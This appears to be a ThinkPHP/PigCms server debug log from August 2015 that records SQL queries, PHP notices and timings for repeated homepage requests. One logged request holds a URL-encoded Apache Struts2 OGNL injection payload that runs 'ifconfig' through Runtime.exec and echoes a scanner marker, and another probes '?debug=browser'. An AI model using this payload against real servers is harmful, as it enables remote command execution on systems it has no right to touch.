[ 2015-08-23T07:17:52+08:00 ] 121.42.0.15 /
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.003907s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000976s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.047851s ]
INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.048828s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032226s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.081054s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.082031s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.082031s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.083007s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.083984s ]
INFO: [ view_end ] --END-- [ RunTime:0.000976s ]

[ 2015-08-23T12:27:24+08:00 ] 121.42.0.19 /
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003907s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000976s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.046875s ]
INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.047851s ]
INFO: [ view_parse ] --END-- [ RunTime:0.035156s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.083007s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.083984s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.083984s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.084960s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.084960s ]
INFO: [ view_end ] --END-- [ RunTime:0.000977s ]

[ 2015-08-23T12:27:31+08:00 ] 121.42.0.19 /?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27ifconfig%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023%27heimdall181%27%29%27%29%28bla%29%29
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001954s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000976s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.001953s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.042969s ]
INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.043946s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032226s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.076172s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.077149s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077149s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.078125s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.079102s ]
INFO: [ view_end ] --END-- [ RunTime:0.000000s ]

[ 2015-08-23T12:27:37+08:00 ] 121.42.0.19 /
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.042969s ]
INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.043945s ]
INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.075195s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.076172s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077148s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.077148s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.078125s ]
INFO: [ view_end ] --END-- [ RunTime:0.000976s ]

[ 2015-08-23T12:27:39+08:00 ] 121.42.0.19 /
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.042969s ]
INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.077149s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.078125s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.079102s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.079102s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002929s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.080078s ]
INFO: [ view_end ] --END-- [ RunTime:0.000977s ]

[ 2015-08-23T12:27:52+08:00 ] 121.42.0.19 /?debug=browser
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.040039s ]
INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.041992s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.074219s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.075195s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.075195s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.076172s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.077149s ]
INFO: [ view_end ] --END-- [ RunTime:0.000000s ]

[ 2015-08-23T12:27:59+08:00 ] 121.42.0.19 /
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
